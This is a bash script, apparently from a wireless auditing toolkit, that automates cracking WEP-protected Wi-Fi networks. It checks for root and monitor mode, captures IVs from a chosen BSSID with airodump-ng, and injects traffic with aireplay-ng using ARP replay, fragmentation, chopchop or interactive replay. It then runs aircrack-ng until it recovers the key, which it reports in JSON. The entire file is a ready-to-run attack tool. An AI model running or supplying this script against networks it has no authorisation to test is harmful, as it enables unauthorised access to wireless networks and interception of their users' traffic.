#!/usr/bin/env bash
# WEP attack methods
# Usage: wep_attack.sh <interface> <bssid> <channel> <method> [duration]
# Methods: ptw, fragmentation, chopchop, arpreplay, interactive

set -euo pipefail

_log()   { echo "$*" >&2; }
_json()  { printf '%s\n' "$*"; }
_die()   { _json "{\"status\":\"error\",\"message\":\"$1\"}"; exit 1; }

cleanup() {
    _log "[*] Cleaning up WEP attack..."
    for pidvar in AIRODUMP_PID AIREPLAY_PID Aircrack_PID; do
        if [[ -n "${!pidvar:-}" ]]; then
            kill "${!pidvar}" 2>/dev/null || true
            wait "${!pidvar}" 2>/dev/null || true
        fi
    done
    if [[ -n "${ORIG_CHANNEL:-}" && -n "${IFACE:-}" ]]; then
        iw "$IFACE" set channel "$ORIG_CHANNEL" 2>/dev/null || true
    fi
    exit "${EXIT_RC:-0}"
}
trap cleanup EXIT

# ── Root check ────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    _die "Root privileges required"
fi

# ── Dependency check ──────────────────────────────────────────────────
for cmd in airodump-ng aireplay-ng aircrack-ng; do
    if ! command -v "$cmd" &>/dev/null; then
        _die "$cmd not found. Install aircrack-ng."
    fi
done

# ── Args ──────────────────────────────────────────────────────────────
IFACE="${1:-}"
BSSID="${2:-}"
CHANNEL="${3:-6}"
METHOD="${4:-ptw}"
DURATION="${5:-120}"

if [[ -z "$IFACE" || -z "$BSSID" ]]; then
    _die "Usage: wep_attack.sh <interface> <bssid> <channel> <method> [duration]"
fi

BSSID=$(echo "$BSSID" | tr '[:lower:]' '[:upper:]')
VALID_METHODS="ptw fragmentation chopchop arpreplay interactive"
if ! echo "$VALID_METHODS" | grep -qw "$METHOD"; then
    _die "Invalid method '$METHOD'. Valid: $VALID_METHODS"
fi

# ── Validate interface ────────────────────────────────────────────────
if [[ ! -d "/sys/class/net/$IFACE" ]]; then
    _die "Interface '$IFACE' does not exist"
fi

MODE=$(iw "$IFACE" info 2>/dev/null | awk '/type/{print $2}' || echo "unknown")
if [[ "$MODE" != "monitor" ]]; then
    _die "Interface $IFACE is not in monitor mode"
fi

# ── Setup ─────────────────────────────────────────────────────────────
ORIG_CHANNEL=$(iw "$IFACE" info 2>/dev/null | awk '/channel/{print $2}' || echo "1")
TMPDIR_WORK=$(mktemp -d /tmp/wafford_wep.XXXXXX)
CAP_FILE="${TMPDIR_WORK}/wep_capture"
IVS_FILE="${TMPDIR_WORK}/wep_capture-01.ivs"

_log "[*] WEP attack: method=$METHOD bssid=$BSSID channel=$CHANNEL duration=${DURATION}s"

# Set channel
iw "$IFACE" set channel "$CHANNEL" 2>/dev/null || true

# ── Start airodump-ng to capture IVs ─────────────────────────────────
_log "[*] Starting airodump-ng to capture IVs..."
airodump-ng \
    --bssid "$BSSID" \
    --channel "$CHANNEL" \
    --write "$CAP_FILE" \
    --output-format ivs,csv \
    "$IFACE" \
    2>/dev/null &
AIRODUMP_PID=$!
sleep 2

# ── Attack methods ───────────────────────────────────────────────────
run_attack() {
    local method="$1"

    case "$method" in
        ptw)
            _log "[*] PTW attack: Starting ARP replay..."
            aireplay-ng -3 -b "$BSSID" --ignore-negative-one "$IFACE" 2>/dev/null &
            AIREPLAY_PID=$!
            ;;
        fragmentation)
            _log "[*] Fragmentation attack..."
            # Request fragmentation
            aireplay-ng -5 -b "$BSSID" --ignore-negative-one "$IFACE" 2>/dev/null &
            AIREPLAY_PID=$!

            # After getting fragments, inject
            sleep 10
            if [[ -f "${TMPDIR_WORK}/fragment.xor" ]]; then
                _log "[*] Injecting fragmented packets..."
                aireplay-ng -2 -r "${TMPDIR_WORK}/fragment.xor" --ignore-negative-one "$IFACE" 2>/dev/null &
                AIREPLAY_PID=$!
            fi
            ;;
        chopchop)
            _log "[*] ChopChop/KoreK attack..."
            aireplay-ng -4 -b "$BSSID" --ignore-negative-one "$IFACE" 2>/dev/null &
            AIREPLAY_PID=$!

            sleep 10
            if [[ -f "${TMPDIR_WORK}/chopchop.xor" ]]; then
                _log "[*] Injecting decrypted packets..."
                aireplay-ng -2 -r "${TMPDIR_WORK}/chopchop.xor" --ignore-negative-one "$IFACE" 2>/dev/null &
                AIREPLAY_PID=$!
            fi
            ;;
        arpreplay)
            _log "[*] ARP replay attack..."
            aireplay-ng -3 -b "$BSSID" --ignore-negative-one "$IFACE" 2>/dev/null &
            AIREPLAY_PID=$!
            ;;
        interactive)
            _log "[*] Interactive packet replay..."
            aireplay-ng -7 -b "$BSSID" --ignore-negative-one "$IFACE" 2>/dev/null &
            AIREPLAY_PID=$!
            ;;
    esac
}

run_attack "$METHOD"

# ── Monitor IV count and attempt cracking ─────────────────────────────
ELAPSED=0
IVS_COUNT=0
CHECK_INTERVAL=10
CRACK_ATTEMPTS=0
KEY_FOUND="false"
KEY=""

_end_time=$(( $(date +%s) + DURATION ))

while [[ $(date +%s) -lt $_end_time ]]; do
    sleep "$CHECK_INTERVAL"
    ELAPSED=$(( ELAPSED + CHECK_INTERVAL ))

    # Count IVs
    if [[ -f "$IVS_FILE" ]]; then
        IVS_COUNT=$(stat -c%s "$IVS_FILE" 2>/dev/null || echo "0")
        IVS_COUNT=$(( IVS_COUNT / 8 ))  # Approximate IV count from file size
    fi

    _log "[*] Elapsed: ${ELAPSED}s | IVs: ~${IVS_COUNT}"

    # Attempt cracking periodically
    CAP_01="${CAP_FILE}-01.ivs"
    if [[ -f "$CAP_01" && "$IVS_COUNT" -gt 20000 ]]; then
        CRACK_ATTEMPTS=$((CRACK_ATTEMPTS + 1))
        _log "[*] Attempt #${CRACK_ATTEMPTS}: Trying to crack WEP key..."

        CRACK_OUTPUT=""
        if [[ "$METHOD" == "ptw" ]]; then
            CRACK_OUTPUT=$(aircrack-ng -z -b "$BSSID" "$CAP_01" 2>&1 || true)
        else
            CRACK_OUTPUT=$(aircrack-ng -b "$BSSID" "$CAP_01" 2>&1 || true)
        fi

        if echo "$CRACK_OUTPUT" | grep -q "KEY FOUND"; then
            KEY=$(echo "$CRACK_OUTPUT" | grep -oP 'KEY FOUND!\s*\[\s*\K[^]\s]+' || true)
            if [[ -n "$KEY" ]]; then
                KEY_FOUND="true"
                _log "[+] KEY FOUND: $KEY"
                break
            fi
        fi
    fi
done

# ── Final crack attempt ──────────────────────────────────────────────
if [[ "$KEY_FOUND" == false ]]; then
    CAP_01="${CAP_FILE}-01.ivs"
    if [[ -f "$CAP_01" ]]; then
        _log "[*] Final crack attempt..."
        CRACK_OUTPUT=$(aircrack-ng -b "$BSSID" "$CAP_01" 2>&1 || true)
        if echo "$CRACK_OUTPUT" | grep -q "KEY FOUND"; then
            KEY=$(echo "$CRACK_OUTPUT" | grep -oP 'KEY FOUND!\s*\[\s*\K[^]\s]+' || true)
            if [[ -n "$KEY" ]]; then
                KEY_FOUND="true"
                _log "[+] KEY FOUND: $KEY"
            fi
        fi
    fi
fi

# ── Stop attacks ──────────────────────────────────────────────────────
for pidvar in AIREPLAY_PID AIRODUMP_PID; do
    if [[ -n "${!pidvar:-}" ]]; then
        kill "${!pidvar}" 2>/dev/null || true
        wait "${!pidvar}" 2>/dev/null || true
    fi
done

# ── Output ────────────────────────────────────────────────────────────
RESULT="{\"status\":\"success\",\"method\":\"${METHOD}\",\"bssid\":\"${BSSID}\",\"channel\":${CHANNEL},\"ivs_count\":${IVS_COUNT},\"key_found\":${KEY_FOUND},\"crack_attempts\":${CRACK_ATTEMPTS},\"duration\":${DURATION}}"
if [[ -n "$KEY" ]]; then
    RESULT=$(echo "$RESULT" | sed "s/}$/,\"key\":\"${KEY}\"}/")
fi

_json "$RESULT"
